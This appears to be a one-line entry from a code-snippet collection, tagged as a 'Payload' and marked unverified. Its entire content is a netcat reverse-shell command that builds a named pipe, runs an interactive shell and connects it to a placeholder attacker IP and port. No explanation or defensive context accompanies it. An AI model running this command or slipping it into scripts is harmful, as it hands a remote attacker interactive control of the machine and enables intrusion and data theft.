---
id: 363c9df3-bbe1-4147-a96a-8d7267ec0a6b
type: code
language: Payload
verified: false
created_at: '2019-11-15T20:30:35.863388+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 363c9df3

**Language**: Payload

```payload
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $_ATTACKER_IP $_ATTACKER_PORT >/tmp/f
```


